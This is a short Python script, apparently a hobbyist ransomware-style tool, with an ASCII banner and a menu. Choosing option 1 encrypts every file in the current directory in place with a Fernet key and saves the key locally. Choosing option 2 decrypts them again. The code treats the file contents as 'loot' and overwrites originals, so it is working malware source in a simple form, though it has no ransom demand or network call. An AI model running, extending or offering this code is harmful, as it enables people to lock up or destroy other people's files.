#!/usr/bin/env python3
# Author: sidious

import os
from os import system, name
from cryptography.fernet import Fernet

def bAnn():
    print('''
    
 ███████╗██╗██████╗ ██████╗  ██████╗ ███████╗███████╗
 ██╔════╝██║██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔════╝
 ███████╗██║██║  ██║██████╔╝██║   ██║███████╗█████╗  
 ╚════██║██║██║  ██║██╔══██╗██║   ██║╚════██║██╔══╝  
 ███████║██║██████╔╝██║  ██║╚██████╔╝███████║███████╗
 ╚══════╝╚═╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝
                       (1): Encrypting
                       (2): Decrypting               
''')

def Doh():
    print('''
⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠙⠿⠛⠉⠁⠀⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡿⠁⠀⢠⠤⠖⠒⠒⠲⢬⣇⣀⠤⠠⢄⣀⡹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡯⠁⠀⠀⠀⣠⣴⡶⠖⠲⠾⣢⡠⣴⡲⠶⠶⣶⣝⢿⣿⣿⣿⣿⣿⣿⣿⣿
⡿⠋⠀⠀⠀⠀⢞⣛⠋⠁⠀⠀⠀⠀⠀⡧⠀⠀⠀⠀⠀⠀⡀⣿⣿⣿⣿⣿⣿⣿
⠁⠀⠀⠀⠀⠀⠀⢹⡿⢶⣶⣶⣶⣶⣾⠿⠷⢶⡶⠶⠶⠟⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⢠⠴⠞⠋⠀⠐⠲⠼⣷⠖⠲⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⣠⠾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⢻⣿⣿⡿⢃⢰⡍⠝⣿
⠀⠀⠀⠀⠀⠐⣵⣖⣓⡲⠦⣤⣤⣄⣀⣀⣀⣀⣀⣨⡥⢆⣏⢨⠻⡘⣆⣷⡸⣸
⠀⠀⠀⠀⠐⢄⡈⠉⠉⠉⠙⠒⢂⡄⡀⠀⡄⠶⠶⠶⣂⡿⢻⢸⣷⣾⣿⢟⣵⣿
⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀ ⢦⡀⢸⣤⣇⢠⡇⢰⠐⣿⡟⢰⣿⣿⠟⣫⣾⣿⣿
⣿⣿⣿⣶⣶⣤⣤⣄⣀⣀⣀⣙⠻⢿⢿⣿⠖⢫⣾⣿⣷⢸⣿⣿⡇⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⡆⣿⣦⡙⢿⣿⣏⣿⣿⣷⠻⣿⣿⣿⣿
⣿⣿⣿⣿⣎⠻⣿⣿⣿⣿⣿⡇⣿⣿⣿⢁⣿⣿⣿⣦⡙⣿⢻⣿⣿⡇⢿⣿⣿⣿
⡝⣿⣿⣿⣿⣷⣜⢿⣿⣿⡿⢰⣿⣿⣿⢘⢿⣿⣿⣿⣿⢀⣿⣿⣿⡇⣾⣿⣿⣿
⣿⡌⢿⣿⣿⣿⣿⣧⡙⢿⢣⣿⣿⣿⡏⣼⣧⣌⠻⢿⢣⣿⣿⣿⣿⢇⣿⣿⣿⣿
    ''')

SYS_FILES=[]

def indexer():
    for file in os.listdir():
        if file == "sidrose.py" or file == "very-special-key":
            continue
        if os.path.isfile(file):
            SYS_FILES.append(file)

def eNCryptor():
    SEC_KEY=Fernet.generate_key()
    with open("very-special-key", "wb") as unl_key:
        unl_key.write(SEC_KEY)
    
    for file in SYS_FILES:
        with open(file, "rb") as enc_file:
            loot=enc_file.read()
        loot_enc=Fernet(SEC_KEY).encrypt(loot)
        with open(file, "wb") as enc_file:
            enc_file.write(loot_enc)

def dECryptor():
    with open("very-special-key", "rb") as key:
        SEC_KEY=key.read()
    try:
        for file in SYS_FILES:
            with open(file, "rb") as enc_file:
                loot=enc_file.read()
            loot_dec=Fernet(SEC_KEY).decrypt(loot)
            with open(file, "wb") as enc_file:
                enc_file.write(loot_dec)
    except Exception as error:
        print("An error has occurred, check your key!")
    
if __name__ == "__main__":
    try:
        bAnn()
        EXECU_IN=input(":")
        if EXECU_IN == "1":
            indexer()
            eNCryptor()
        elif EXECU_IN == "2":
            indexer()
            dECryptor()
        else:
            if name == 'nt':
                _ = system('cls')
            else:
                _ = system('clear')
            Doh()
            print("Please choose either 1 or 2")
            exit ()
    except KeyboardInterrupt:
        print()
        exit()
